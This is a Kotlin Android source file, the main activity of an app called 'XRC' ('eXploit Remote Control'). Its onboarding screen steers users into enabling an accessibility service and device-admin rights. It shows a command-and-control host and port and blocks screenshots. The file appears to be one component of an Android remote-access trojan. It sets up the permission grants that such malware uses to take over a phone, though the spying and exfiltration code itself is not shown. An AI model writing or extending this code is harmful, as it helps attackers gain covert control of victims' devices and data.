package com.xrc

import com.xrc.R
import android.app.admin.DevicePolicyManager
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.view.WindowManager
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.material3.Button
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.unit.dp
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import com.xrc.core.di.ServiceLocator
import com.xrc.ui.theme.XrcTheme
import com.xrc.xrc.XrcAccessibilityService
import com.xrc.xrc.XrcDeviceAdminReceiver

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.setFlags(
            WindowManager.LayoutParams.FLAG_SECURE,
            WindowManager.LayoutParams.FLAG_SECURE
        )
        enableEdgeToEdge()
        setContent {
            XrcTheme {
                OnboardingScreen()
            }
        }
    }
}

@Composable
private fun OnboardingScreen() {
    val context = LocalContext.current
    var a11yEnabled by remember { mutableStateOf(XrcAccessibilityService.isEnabled(context)) }
    var adminActive by remember { mutableStateOf(XrcDeviceAdminReceiver.isActive(context)) }
    val c2Host = remember { ServiceLocator.config().c2Host }
    val c2Port = remember { ServiceLocator.config().c2Port }

    val lifecycleOwner = LocalLifecycleOwner.current
    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                a11yEnabled = XrcAccessibilityService.isEnabled(context)
                adminActive = XrcDeviceAdminReceiver.isActive(context)
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    Scaffold { innerPadding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
                .padding(horizontal = 24.dp)
                .statusBarsPadding(),
            verticalArrangement = Arrangement.Center
        ) {
            Text(
                text = "XRC",
                style = MaterialTheme.typography.displayLarge,
                fontFamily = FontFamily.Monospace,
                color = MaterialTheme.colorScheme.primary
            )
            Spacer(Modifier.height(8.dp))
            Text(
                text = "eXploit Remote Control",
                style = MaterialTheme.typography.bodyMedium,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )
            Spacer(Modifier.height(32.dp))

            StatusCard(
                label = context.getString(R.string.status_a11y),
                value = if (a11yEnabled) context.getString(R.string.status_enabled)
                else context.getString(R.string.status_disabled),
                active = a11yEnabled
            )
            Spacer(Modifier.height(12.dp))
            StatusCard(
                label = context.getString(R.string.status_admin),
                value = if (adminActive) context.getString(R.string.status_active)
                else context.getString(R.string.status_inactive),
                active = adminActive
            )
            Spacer(Modifier.height(12.dp))
            StatusCard(
                label = context.getString(R.string.status_c2),
                value = "$c2Host:$c2Port",
                active = true
            )

            Spacer(Modifier.height(40.dp))

            Button(
                onClick = {
                    context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                },
                modifier = Modifier.fillMaxWidth()
            ) {
                Text(context.getString(R.string.btn_enable_a11y))
            }
            Spacer(Modifier.height(12.dp))
            Button(
                onClick = {
                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                        putExtra(
                            DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                            XrcDeviceAdminReceiver.getComponentName(context)
                        )
                        putExtra(
                            DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                            context.getString(R.string.admin_description)
                        )
                    }
                    context.startActivity(intent)
                },
                modifier = Modifier.fillMaxWidth()
            ) {
                Text(context.getString(R.string.btn_enable_admin))
            }
        }
    }
}

@Composable
private fun StatusCard(label: String, value: String, active: Boolean) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(
            containerColor = MaterialTheme.colorScheme.surface
        )
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp),
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Text(label, style = MaterialTheme.typography.bodyMedium)
            Text(
                text = value,
                style = MaterialTheme.typography.bodyMedium,
                color = if (active) MaterialTheme.colorScheme.primary
                else MaterialTheme.colorScheme.onSurfaceVariant
            )
        }
    }
}
